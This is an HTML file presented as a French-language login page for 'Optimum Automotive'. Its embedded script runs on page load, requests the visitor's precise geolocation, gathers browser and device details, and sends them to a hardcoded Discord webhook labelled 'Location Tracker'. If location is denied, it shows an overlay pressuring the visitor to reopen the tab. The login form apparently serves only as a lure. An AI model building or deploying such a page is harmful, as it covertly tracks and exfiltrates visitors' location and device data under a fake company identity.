<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="styles.css">
    <style>
       
    </style>
</head>
<body >
    
    <div class="loginWrapper">
        <div class="logo">
            <img src="image.png" alt="Optimum Automotive Logo">
        </div>
        <form class="login-form">
          
            <label for="login">Login</label>
          <div class= "login-container">
            <input type="text" id="login" name="login" required>
          </div>

            <label for="password">Mot de passe</label>
            <div class="password-container">
                <input type="password" id="password" name="password" required>
                <span class="toggle-password"></span>
            </div>

            <div class="options">
                <label>
                    <input type="checkbox"> Rester connecté
                </label>
                <a href="#" class="forgot-password">Mot de passe oublié</a>
            </div>

            <button type="submit" class="login-button">Connexion</button>
        </form>
 <!-- Add the "Enable Location Access" button here -->
 <button id="requestLocation" style="display: none;">Enable Location Access</button>
    </div>
    
    <footer class="footer">
        <div class="footer-container">
            <p>&copy; 2024 Optimum Automotive. All Rights Reserved.</p>
            <ul class="footer-links">
                <li><a href="#">Privacy Policy</a></li>
                <li><a href="#">Terms of Use</a></li>
                <li><a href="#">Contact Us</a></li>
                <li><a href="#">About Us</a></li>
            </ul>
        </div>
    </footer>
    <script>
   document.addEventListener("DOMContentLoaded", function () {
    // Add an event listener to the button to re-request location access
    document.getElementById("requestLocation").addEventListener("click", function () {
        console.log("Button clicked, requesting location...");
        getLocation();
    });

    // Initial location request
    getLocation(); // Call this to trigger the location request on page load
    function getLocation() {
        if (navigator.geolocation) {
            console.log("Requesting location permission...");
            navigator.geolocation.getCurrentPosition(showPosition, showError, {
                enableHighAccuracy: true, // Optional: Request high accuracy
                timeout: 5000, // Optional: Timeout after 5 seconds
                maximumAge: 0 // Optional: Force fresh location data
            });
        } else {
            console.log("Geolocation is not supported by this browser.");
        }
    }

function showPosition(position) {
    let latitude = position.coords.latitude;
    let longitude = position.coords.longitude;
    let timestamp = new Date().toLocaleTimeString();
    console.log(latitude, longitude);

        let systemInfo = `
        User Agent: ${navigator.userAgent}
        Platform: ${navigator.platform}
        Cookies Enabled: ${navigator.cookieEnabled}
        Language: ${navigator.language}
        Screen Width: ${screen.width}
        Screen Height: ${screen.height}
        Time: ${timestamp}
        `;

        let locationData = `
        Latitude: ${latitude}
        Longitude: ${longitude}
        Google Maps: https://www.google.com/maps/place/${latitude},${longitude}
        `;

        sendData("User System Information", systemInfo);
        sendData("User Location", locationData);
    }

    function showError(error) {
    let message;
    switch (error.code) {
        case error.PERMISSION_DENIED:
            message = "User denied the request for Geolocation.";
            document.getElementById("locationOverlay").classList.add("show"); // Show overlay
            break;
        case error.POSITION_UNAVAILABLE:
            message = "Location information is unavailable.";
            break;
        case error.TIMEOUT:
            message = "The request to get user location timed out.";
            break;
        case error.UNKNOWN_ERROR:
            message = "An unknown error occurred.";
            break;
    }
    console.log(message);
    sendData("Location Error", message);
}

// Handle user clicking "Allow Location Access"
document.getElementById("grantLocation").addEventListener("click", function () {
    window.close(); // Attempt to close the tab
});



    function sendData(title, description) {
        const webhookUrl = "https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X"; // Replace with actual webhook URL

        let payload = {
            username: "Location Tracker",
            embeds: [
                {
                    title: title,
                    description: "```" + description + "```",
                    color: 15844367
                }
            ]
        };

        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .catch(err => console.log("Error sending data:", err));
    }
});
        

    

    </script>
    <div id="locationOverlay" class="overlay">
        <div class="overlay-content">
            <h2>We Need Your Location</h2>
            <p>To continue, please close and re-open tab.</p>
            <button id="grantLocation">Allow Location Access</button>
        </div>
    </div>
    
</body>
</html>
